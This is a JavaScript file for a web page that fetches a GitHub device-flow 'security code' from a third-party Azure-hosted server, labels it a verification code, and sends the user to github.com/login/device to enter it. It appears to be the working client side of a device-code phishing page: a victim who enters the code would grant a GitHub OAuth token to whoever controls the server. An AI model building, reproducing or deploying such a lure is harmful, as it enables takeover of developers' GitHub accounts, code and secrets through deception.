const API_BASE_URL = 'https://git-verify.azurewebsites.net';

// Add CORS-friendly request function
async function makeAPIRequest(url, options = {}) {
    const defaultOptions = {
        mode: 'cors',
        credentials: 'omit',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            ...options.headers
        }
    };
    
    const finalOptions = { ...defaultOptions, ...options };
    
    try {
        const response = await fetch(url, finalOptions);
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        return response;
    } catch (error) {
        console.error('API Request Error:', error);
        throw error;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const generateCodeButton = document.getElementById('GENERATE_CODE');
    const copyCodeButton = document.getElementById('COPY_CODE');
    const codeDisplay = document.getElementById('CODE_DISPLAY');
    const registrationCodeElement = document.getElementById('REGISTRATION_CODE');
    const authButton = document.getElementById('AUTH_BUTTON');

    if (generateCodeButton) {
        generateCodeButton.addEventListener('click', generateVerificationCode);
    }
    
    if (copyCodeButton) {
        copyCodeButton.addEventListener('click', copyCodeToClipboard);
    }
    
    if (authButton) {
        authButton.addEventListener('click', handleAuthButtonClick);
    }

    // Initially hide copy button and disable auth button
    if (copyCodeButton) {
        copyCodeButton.style.display = 'none';
    }
    
    // Set initial auth button state
    updateAuthButtonState(false);
});

let CURRENT_USER_CODE = null;

function handleAuthButtonClick(event) {
    event.preventDefault();
    
    if (!CURRENT_USER_CODE) {
        showMessage('Please generate a security code first', 'error');
        return;
    }
    
    // Open in new tab
    window.open('https://github.com/login/device', '_blank');
}

function updateAuthButtonState(hasCode) {
    const authButton = document.getElementById('AUTH_BUTTON');
    
    if (authButton) {
        if (hasCode) {
            // Enable button and make it green
            authButton.classList.remove('btn-disabled');
            authButton.classList.add('btn-primary');
            authButton.style.pointerEvents = 'auto';
            authButton.style.opacity = '1';
        } else {
            // Disable button and make it gray
            authButton.classList.add('btn-disabled');
            authButton.classList.remove('btn-primary');
            authButton.style.pointerEvents = 'none';
            authButton.style.opacity = '0.6';
        }
    }
}

async function generateVerificationCode() {
    const generateCodeButton = document.getElementById('GENERATE_CODE');
    const registrationCodeElement = document.getElementById('REGISTRATION_CODE');
    const copyCodeButton = document.getElementById('COPY_CODE');
    
    try {
        generateCodeButton.textContent = 'Generating...';
        generateCodeButton.disabled = true;
        
        if (registrationCodeElement) {
            registrationCodeElement.textContent = 'Loading...';
        }
        
        // Use the CORS-friendly request function
        const response = await makeAPIRequest(`${API_BASE_URL}/api/validate`, {
            method: 'POST',
            body: JSON.stringify({})
        });
        
        const data = await response.json();
        
        if (data.success && data.user_code) {
            CURRENT_USER_CODE = data.user_code;
            displayCode(data.user_code);
            
            generateCodeButton.textContent = 'Generate New Code';
            generateCodeButton.disabled = false;
            
            if (copyCodeButton) {
                copyCodeButton.style.display = 'block';
            }
            
            updateAuthButtonState(true);
            showMessage('Device code generated successfully!', 'success');
            
        } else {
            throw new Error(data.error || 'Failed to generate device code');
        }
        
    } catch (error) {
        console.error('Error fetching registration code:', error);
        
        // Check if it's a CORS error
        if (error.message.includes('CORS') || error.message.includes('cross-origin')) {
            showMessage('CORS Error: Please check server configuration', 'error');
        } else {
            showMessage('Failed to generate verification code. Please try again.', 'error');
        }
        
        // Reset button state
        generateCodeButton.textContent = 'Generate Security Code';
        generateCodeButton.disabled = false;
        
        const registrationCodeElement = document.getElementById('REGISTRATION_CODE');
        if (registrationCodeElement) {
            registrationCodeElement.textContent = 'N/A';
        }
        
        CURRENT_USER_CODE = null;
        updateAuthButtonState(false);
        
        const copyCodeButton = document.getElementById('COPY_CODE');
        if (copyCodeButton) {
            copyCodeButton.style.display = 'none';
        }
    }
}

function displayCode(code) {
    const registrationCodeElement = document.getElementById('REGISTRATION_CODE');
    console.log('Displaying code:', code); // Debug log
    console.log('Element found:', registrationCodeElement); // Debug log
    
    if (registrationCodeElement) {
        registrationCodeElement.textContent = code;
        console.log('Code set to:', registrationCodeElement.textContent); // Debug log
    } else {
        console.error('Registration code element not found!');
    }
}

function copyCodeToClipboard() {
    const copyCodeButton = document.getElementById('COPY_CODE');
    
    if (!CURRENT_USER_CODE) {
        showMessage('No code to copy', 'error');
        return;
    }
    
    navigator.clipboard.writeText(CURRENT_USER_CODE).then(() => {
        showMessage('Code copied to clipboard!', 'success');
        
        // Temporarily change button text
        const originalText = copyCodeButton.textContent;
        copyCodeButton.textContent = 'Copied!';
        
        setTimeout(() => {
            copyCodeButton.textContent = originalText;
        }, 2000);
        
    }).catch(err => {
        console.error('Could not copy text: ', err);
        
        // Fallback: select the text
        const registrationCodeElement = document.getElementById('REGISTRATION_CODE');
        if (registrationCodeElement) {
            const range = document.createRange();
            range.selectNode(registrationCodeElement);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            showMessage('Code selected. Press Ctrl+C to copy.', 'success');
        }
    });
}

function showMessage(message, type) {
    // Remove existing messages
    const existingMessage = document.querySelector('.notification-message');
    if (existingMessage) {
        existingMessage.remove();
    }
    
    // Create new message element
    const messageElement = document.createElement('div');
    messageElement.className = `notification-message ${type}`;
    messageElement.textContent = message;
    
    // Insert after the h2 element
    const header = document.querySelector('h2');
    if (header) {
        header.insertAdjacentElement('afterend', messageElement);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (messageElement.parentNode) {
                messageElement.remove();
            }
        }, 5000);
    }
}